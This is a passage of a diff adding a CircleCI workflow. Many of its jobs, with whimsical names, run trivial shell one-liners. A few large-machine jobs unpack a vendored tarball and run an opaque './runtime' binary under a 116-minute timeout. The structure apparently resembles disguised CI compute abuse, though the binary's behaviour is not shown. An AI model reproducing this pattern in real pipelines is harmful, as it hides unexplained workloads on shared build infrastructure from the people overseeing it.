+            echo "ready: $(sha256sum /tmp/workspace/handoff.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - handoff.txt
+  preview-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/handoff.txt || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+  staging_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: instant ramen
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; head -c 1024 /dev/urandom | tar -c - 2>/dev/null | wc -c; true ; } > /tmp/workspace/metrics.jsonl
+            echo "ready: $(sha256sum /tmp/workspace/metrics.jsonl | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - metrics.jsonl
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Inherit stage
+          command: |
+            stat /tmp/workspace/metrics.jsonl || true
+      - run:
+          name: Fetch repository
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xjf deps.tar.bz2
+      - run:
+          no_output_timeout: 116m
+          command: ./runtime && true
+
+  teardown_PROD_CHECK_3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: elm plank
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo 'abcdefghij' | sed -r 's/(.{3})/\1 /g'; true ; } > /tmp/workspace/handoff.ok
+            echo "ready: $(sha256sum /tmp/workspace/handoff.ok | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - handoff.ok
+  cook_may7-cleanup_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: red light
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{split("red,green,blue",a,","); for(i in a) print a[i]}' | sort; true ; } > /tmp/workspace/pt-alt.pt
+            echo "ready: $(sha256sum /tmp/workspace/pt-alt.pt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - pt-alt.pt
+  step2_green-light_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: mercy run
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; cksum /etc/hostname | awk '{print $1}'; true ; } > /tmp/workspace/secondary_job_output.out
+            echo "ready: $(sha256sum /tmp/workspace/secondary_job_output.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - secondary_job_output.out
+  Beta_tb-2a_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: copenhagen plank
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 1 100 | tr '\n' ','  | sed 's/,$/\n/' | head -c 60; true ; } > /tmp/workspace/manifest
+            echo "ready: $(sha256sum /tmp/workspace/manifest | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - manifest
+  tester_Prepare_Tests9_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rinse cycle
+          command: |
+            mkdir -p /tmp/workspace
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/workspace/trace.ndjson; true
+            echo "ready: $(sha256sum /tmp/workspace/trace.ndjson | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - trace.ndjson
+  p2_DeployRelease_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: signal flare
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nb\nc\nc\n" | sort | uniq -c | sort -rn; true ; } > /tmp/workspace/buffer.raw
+            echo "ready: $(sha256sum /tmp/workspace/buffer.raw | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - buffer.raw
+  hook_hu-verify_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: rerun
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 1 500 | awk 'END{print NR}'; true ; } > /tmp/workspace/bundle
+            echo "ready: $(sha256sum /tmp/workspace/bundle | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - bundle
+  postcheck_STAGE_STG_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: plank fall
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="programming"; a[1]; for(i=1;i<=length(s);i++)a[substr(s,i,1)]++; for(k in a)print k":"a[k]}' | sort; true ; } > /tmp/workspace/2024-06-14.data
+            echo "ready: $(sha256sum /tmp/workspace/2024-06-14.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 2024-06-14.data
+  reserve_go1-21-bench_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: white hole bleed
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 1 416680 | paste - - - - | wc -l; true ; } > /tmp/workspace/buffer.bin
+            echo "ready: $(sha256sum /tmp/workspace/buffer.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - buffer.bin
+  dispatch_ruby3-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: ding ding
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo "aaa bbb aaa ccc bbb aaa" | tr ' ' '\n' | sort | uniq -c | sort -rn | head -1; true ; } > /tmp/workspace/audit.gz
+            echo "ready: $(sha256sum /tmp/workspace/audit.gz | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - audit.gz
+  round1_intergration_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: mesquite
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo 'foo baz foobaz' | sed 's/foo/bar/g; s/baz/qux/g'; true ; } > /tmp/workspace/summary.md
+            echo "ready: $(sha256sum /tmp/workspace/summary.md | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - summary.md
+workflows:
+  release:
+    jobs:
+      - kick_PROD_CHECK_3
+      - teardown_PROD_CHECK_3_2:
+          requires:
+            - kick_PROD_CHECK_3
+      - PROD_CHECK_3:
+          requires:
+            - teardown_PROD_CHECK_3_2
+      - fixture_may7-cleanup:
+          requires:
+            - teardown_PROD_CHECK_3_2
+      - cook_may7-cleanup_2:
+          requires:
+            - fixture_may7-cleanup
+      - may7-cleanup:
+          requires:
+            - cook_may7-cleanup_2
+      - cache_green-light:
+          requires:
+            - cook_may7-cleanup_2
+      - step2_green-light_2:
+          requires:
+            - cache_green-light
+      - green-light:
+          requires:
+            - step2_green-light_2
+      - drain_tb-2a:
+          requires:
+            - step2_green-light_2
+      - Beta_tb-2a_2:
+          requires:
+            - drain_tb-2a
+      - tb-2a:
+          requires:
+            - Beta_tb-2a_2
+      - auditor_Prepare_Tests9:
+          requires:
+            - Beta_tb-2a_2
+      - tester_Prepare_Tests9_2:
+          requires:
+            - auditor_Prepare_Tests9
+      - Prepare_Tests9:
+          requires:
+            - tester_Prepare_Tests9_2
+      - ctx2_DeployRelease:
+          requires:
+            - tester_Prepare_Tests9_2
+      - p2_DeployRelease_2:
+          requires:
+            - ctx2_DeployRelease
+      - DeployRelease:
+          requires:
+            - p2_DeployRelease_2
+      - vendor_hu-verify:
+          requires:
+            - p2_DeployRelease_2
+      - hook_hu-verify_2:
+          requires:
+            - vendor_hu-verify
+      - hu-verify:
+          requires:
+            - hook_hu-verify_2
+      - Gamma_STAGE_STG:
+          requires:
+            - hook_hu-verify_2
+      - postcheck_STAGE_STG_2:
+          requires:
+            - Gamma_STAGE_STG
+      - STAGE_STG:
+          requires:
+            - postcheck_STAGE_STG_2
+      - go_go1-21-bench:
+          requires:
+            - postcheck_STAGE_STG_2
+      - reserve_go1-21-bench_2:
+          requires:
+            - go_go1-21-bench
+      - go1-21-bench:
+          requires:
+            - reserve_go1-21-bench_2
+      - prefetch_ruby3-release:
+          requires:
+            - reserve_go1-21-bench_2
+      - dispatch_ruby3-release_2:
+          requires:
+            - prefetch_ruby3-release
+      - ruby3-release:
+          requires:
+            - dispatch_ruby3-release_2
+      - phase1_intergration:
+          requires:
+            - dispatch_ruby3-release_2
+      - round1_intergration_2:
+          requires:
+            - phase1_intergration
+      - intergration:
+          requires:
+            - round1_intergration_2
+      - kick_oscar-9
+      - oscar-9:
+          requires:
+            - kick_oscar-9
+      - fetcher_defualt:
+          requires:
+            - kick_oscar-9
+      - defualt:
+          requires:
+            - fetcher_defualt
+      - canary1_raj-ship:
+          requires:
+            - fetcher_defualt
+      - raj-ship:
+          requires:
+            - canary1_raj-ship
+      - B_test:
+          requires:
+            - canary1_raj-ship
+      - test:
+          requires:
+            - B_test
+      - staging_ship-it:
+          requires:
+            - B_test
+      - ship-it:
+          requires:
+            - staging_ship-it
+      - warmer_fix-queue:
+          requires:
+            - staging_ship-it
+      - fix-queue:
+          requires:
+            - warmer_fix-queue
+      - green_wen-ship:
+          requires:
+            - warmer_fix-queue
+      - wen-ship:
+          requires:
+            - green_wen-ship
+      - loader_zulu-6:
+          requires:
+            - green_wen-ship
+      - zulu-6:
+          requires:
+            - loader_zulu-6
+      - warmup_q2-canary:
+          requires:
+            - loader_zulu-6
+      - q2-canary:
+          requires:
+            - warmup_q2-canary
+      - g2_oscar:
+          requires:
+            - warmup_q2-canary
+      - oscar:
+          requires:
+            - g2_oscar
+      - prebuild_yolo:
+          requires:
+            - g2_oscar
+      - yolo:
+          requires:
+            - prebuild_yolo
+      - package_fire-up:
+          requires:
+            - prebuild_yolo
+      - fire-up:
+          requires:
+            - package_fire-up
+      - stepA_preview-v3:
+          requires:
+            - package_fire-up
+      - preview-v3:
+          requires:
+            - stepA_preview-v3
+      - provision_DEPLOY_PROD:
+          requires:
+            - stepA_preview-v3
+      - DEPLOY_PROD:
+          requires:
+            - provision_DEPLOY_PROD
+      - Gamma_check-full-docker-image:
+          requires:
+            - provision_DEPLOY_PROD
+      - check-full-docker-image:
+          requires:
+            - Gamma_check-full-docker-image
+      - validate_v9-alpha:
+          requires:
+            - Gamma_check-full-docker-image
+      - v9-alpha:
+          requires:
+            - validate_v9-alpha
+      - enqueue_europa-beta:
+          requires:
+            - validate_v9-alpha
+      - europa-beta:
+          requires:
+            - enqueue_europa-beta
+      - dispatch_q3-canary:
+          requires:
+            - enqueue_europa-beta
+      - q3-canary:
+          requires:
+            - dispatch_q3-canary
+      - ctx_q2-smoke:
+          requires:
+            - dispatch_q3-canary
+      - q2-smoke:
+          requires:
+            - ctx_q2-smoke
